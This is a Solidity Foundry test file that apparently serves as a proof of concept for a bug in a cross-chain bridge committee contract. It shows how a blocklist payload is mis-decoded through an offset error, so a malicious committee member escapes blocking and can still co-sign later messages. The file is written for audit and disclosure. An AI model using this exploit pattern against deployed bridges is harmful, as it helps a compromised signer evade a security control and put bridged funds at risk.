pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {BridgeUtils} from "../src/contracts/utils/BridgeUtils.sol";
import {BridgeCommittee} from "../src/contracts/BridgeCommittee.sol";
import {BridgeConfig} from "../src/contracts/BridgeConfig.sol";
contract BlocklistExploitTest is Test {
    BridgeCommittee committee;
    BridgeConfig config;
    uint256 pkS1 = 0xA11CE;
    uint256 pkS2 = 0xB0B;
    uint256 pkM = 0xBADCAFE;
    address S1;
    address S2;
    address M;
    uint8 constant CHAIN_ID = 1;
    function setUp() public {
        S1 = vm.addr(pkS1);
        S2 = vm.addr(pkS2);
        M = vm.addr(pkM);
        BridgeCommittee impl = new BridgeCommittee();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        committee = BridgeCommittee(address(proxy));
        address[] memory members = new address[](3);
        members[0] = S1;
        members[1] = S2;
        members[2] = M;
        uint16[] memory stakes = new uint16[](3);
        stakes[0] = 3000;
        stakes[1] = 3001;
        stakes[2] = 4000;
        committee.initialize(members, stakes, 10000);
        BridgeConfig cfgImpl = new BridgeConfig();
        ERC1967Proxy cfgProxy = new ERC1967Proxy(address(cfgImpl), "");
        config = BridgeConfig(address(cfgProxy));
        address[] memory tokenAddrs = new address[](1);
        tokenAddrs[0] = address(0x1111);
        uint64[] memory prices = new uint64[](1);
        prices[0] = 1;
        uint8[] memory tokenIds = new uint8[](1);
        tokenIds[0] = 2;
        uint8[] memory suiDecimals = new uint8[](1);
        suiDecimals[0] = 8;
        uint8[] memory supportedChains = new uint8[](1);
        supportedChains[0] = CHAIN_ID + 1;
        config.initialize(address(committee), CHAIN_ID, tokenAddrs, prices, tokenIds, suiDecimals, supportedChains);
        committee.initializeConfig(address(config));
        assertEq(config.chainID(), CHAIN_ID);
    }
    // --- helpers ---
    function _sign(bytes32 digest, uint256 pk) internal pure returns (bytes memory sig) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v); // BridgeCommittee.splitSignature expects r||s||v
    }
    function _signers(bytes32 digest, uint256[] memory pks) internal pure returns (bytes[] memory sigs) {
        sigs = new bytes[](pks.length);
        for (uint256 i = 0; i < pks.length; i++) sigs[i] = _sign(digest, pks[i]);
    }
    function test_Exploit_BlocklistDecode_MaliciousNotActuallyBlocked() public {
        address dummy1 = address(0x1001);
        address dummy2 = address(0x1002);
        bytes memory payload = abi.encodePacked(
            uint8(0),
            uint8(3),
            dummy1,
            dummy2,
            M // <-- intended target, will be mis-read due to offset += i*20 bug
        );
        BridgeUtils.Message memory message = BridgeUtils.Message({
            messageType: BridgeUtils.BLOCKLIST,
            version: 1,
            nonce: 0, // first BLOCKLIST message
            chainID: CHAIN_ID, // must match committee.config().chainID()
            payload: payload
        });
        bytes32 digest = BridgeUtils.computeHash(message);
        // Signatures from S1 + S2 (stake = 3000 + 3001 >= 5001 required for BLOCKLIST)
        uint256[] memory pks = new uint256[](2);
        pks[0] = pkS1;
        pks[1] = pkS2;
        bytes[] memory sigs = _signers(digest, pks);
        // verifyMessageAndSignatures(...) -> committee.verifySignatures(...) -> decodeBlocklistPayload(...) -> _updateBlocklist(...)
        committee.updateBlocklistWithSignatures(sigs, message);
        assertTrue(committee.blocklist(dummy1), "dummy1 should be blocklisted");
        assertTrue(committee.blocklist(dummy2), "dummy2 should be blocklisted");
        // ...but the intended 3rd address (M) is NOT blocklisted due to the mis-decoding
        assertFalse(committee.blocklist(M), "malicious member M should still NOT be blocklisted");
        // Nonce advanced (verifier increments for any non-TRANSFER message)
        assertEq(committee.nonces(BridgeUtils.BLOCKLIST), 1, "blocklist nonce should be 1 after first call");
    }
    function test_Impact_MaliciousStillAbleToAuthorizeNextAction() public {
        test_Exploit_BlocklistDecode_MaliciousNotActuallyBlocked();
        address other = address(0xBEEF001);
        bytes memory payload2 = abi.encodePacked(uint8(0), uint8(1), other);
        BridgeUtils.Message memory message2 = BridgeUtils.Message({
            messageType: BridgeUtils.BLOCKLIST,
            version: 1,
            nonce: 1,
            chainID: CHAIN_ID,
            payload: payload2
        });
        bytes32 digest2 = BridgeUtils.computeHash(message2);
        uint256[] memory pks2 = new uint256[](2);
        pks2[0] = pkS1;
        pks2[1] = pkM;
        bytes[] memory sigs2 = _signers(digest2, pks2);
        committee.updateBlocklistWithSignatures(sigs2, message2);
        assertEq(committee.nonces(BridgeUtils.BLOCKLIST), 2, "blocklist nonce should be 2 after second call");
    }
}
